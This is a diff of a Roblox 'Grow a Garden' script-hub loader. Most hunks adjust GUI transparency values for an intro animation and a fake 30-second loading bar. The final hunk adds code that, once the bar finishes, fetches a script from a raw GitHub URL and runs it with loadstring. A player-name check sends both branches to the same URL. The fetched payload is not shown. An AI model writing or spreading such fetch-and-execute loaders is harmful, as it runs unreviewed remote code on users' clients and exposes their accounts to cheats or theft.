@@ -15,7 +15,7 @@ moon.Text = "🐺"
 moon.TextColor3 = Color3.fromRGB(255, 255, 255)
 moon.Font = Enum.Font.FredokaOne
 moon.TextScaled = true
-moon.BackgroundTransparency = 100
+moon.BackgroundTransparency = 1
 moon.AnchorPoint = Vector2.new(0.5, 0.5) -- Setting AnchorPoint for moon too for consistent positioning
 
 local zteText = Instance.new("TextLabel", introBG)
@@ -25,8 +25,8 @@ zteText.Text = "ZEENN SCRIPTS" -- Changed text
 zteText.TextColor3 = Color3.fromRGB(255, 255, 255)
 zteText.Font = Enum.Font.FredokaOne
 zteText.TextScaled = true
-zteText.BackgroundTransparency = 100
-zteText.TextTransparency = 100 -- Start transparent
+zteText.BackgroundTransparency = 1
+zteText.TextTransparency = 1 -- Start transparent
 zteText.AnchorPoint = Vector2.new(0.5, 0.5) -- Set AnchorPoint to the center for accurate positioning
 
 -- Animate intro
@@ -40,7 +40,7 @@ moon:TweenPosition(UDim2.new(0.3, 0, 0.5, 0), "Out", "Sine", 0.7, true) -- Moon 
 wait(0.7) -- Wait for moon to finish moving
 
 -- Phase 2: "ZEENN SCRIPTS" comes from right to middle (quick and fast)
-zteText.TextTransparency = 10 -- Make ZTE visible immediately
+zteText.TextTransparency = 0 -- Make ZTE visible immediately
 zteText:TweenPosition(UDim2.new(0.7, 0, 0.5, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Cubic, 0.6, true) -- Move to right of moon
 wait(0.6) -- Wait for ZTE to reach position
 
@@ -55,7 +55,7 @@ local exitMoon = TweenService:Create(moon, exitTweenInfo, {Position = UDim2.new(
 local exitZTE = TweenService:Create(zteText, exitTweenInfo, {Position = UDim2.new(1.5, 0, 0.5, 0)})
 
 -- Background fades out
-local fadeOutBG = TweenService:Create(introBG, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0), {BackgroundTransparency = 100})
+local fadeOutBG = TweenService:Create(introBG, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0), {BackgroundTransparency = 1})
 
 exitMoon:Play()
 exitZTE:Play()
@@ -76,10 +76,10 @@ background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 local pattern = Instance.new("ImageLabel", background)
 pattern.Size = UDim2.new(2, 0, 2, 0)
 pattern.Position = UDim2.new(-0.5, 0, -0.5, 0)
-pattern.BackgroundTransparency = 100
+pattern.BackgroundTransparency = 1
 pattern.Image = "rbxassetid://15430416594"
 pattern.ImageColor3 = Color3.fromRGB(90, 90, 90)
-pattern.ImageTransparency = 30
+pattern.ImageTransparency = 0.8
 pattern.ScaleType = Enum.ScaleType.Tile
 pattern.TileSize = UDim2.new(0, 250, 0, 250)
 
@@ -97,7 +97,7 @@ title.Text = "🌴  GROW A\nGARDEN  🌴"
 title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.FredokaOne
 title.TextScaled = true
-title.BackgroundTransparency = 101
+title.BackgroundTransparency = 1
 
 local loadingText = Instance.new("TextLabel", background)
 loadingText.Size = UDim2.new(1, 0, 0, 18)
@@ -112,7 +112,7 @@ local barBG = Instance.new("Frame", background)
 barBG.Size = UDim2.new(0.6, 0, 0, 18)
 barBG.Position = UDim2.new(0.2, 0, 0.62, 0)
 barBG.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
-barBG.BackgroundTransparency = 100
+barBG.BackgroundTransparency = 0.5
 barBG.BorderSizePixel = 0
 Instance.new("UICorner", barBG)
 
@@ -128,7 +128,7 @@ discordText.Text = "https://discord.gg/tsernCAJ"
 discordText.TextColor3 = Color3.fromRGB(30, 30, 30)
 discordText.Font = Enum.Font.GothamBold
 discordText.TextSize = 12
-discordText.BackgroundTransparency = 100
+discordText.BackgroundTransparency = 1
 discordText.TextWrapped = true
 
 local percent = Instance.new("TextLabel", background)
@@ -137,7 +137,7 @@ percent.Position = UDim2.new(0, 0, 0.665, 0)
 percent.TextColor3 = Color3.fromRGB(255, 255, 255)
 percent.Font = Enum.Font.GothamBold
 percent.TextSize = 18
-percent.BackgroundTransparency = 100
+percent.BackgroundTransparency = 1
 percent.Text = "0%"
 
 -- Animate loading bar over 30 seconds
@@ -149,4 +149,18 @@ local ratio = i / totalSteps
 percent.Text = tostring(i) .. "%"
 fill:TweenSize(UDim2.new(ratio, 0, 1, 0), "Out", "Sine", 0.2, true)
 wait(duration / totalSteps)
+end
+
+gui:Destroy()
+-- --- PLAYER DETECTION LOGIC ---
+local player = game.Players.LocalPlayer
+if player and player.Name == "Itzfreespam1" then
+-- This is the original script URL for 'Itzfreespam1'
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownloser01001/Gagggg/refs/heads/main/Gagg",true))()
+else
+-- This is for any other player
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownloser01001/Gagggg/refs/heads/main/Gagg",true))()
+end
+-- --- END PLAYER DETECTION LOGIC ---
+end)
 end)
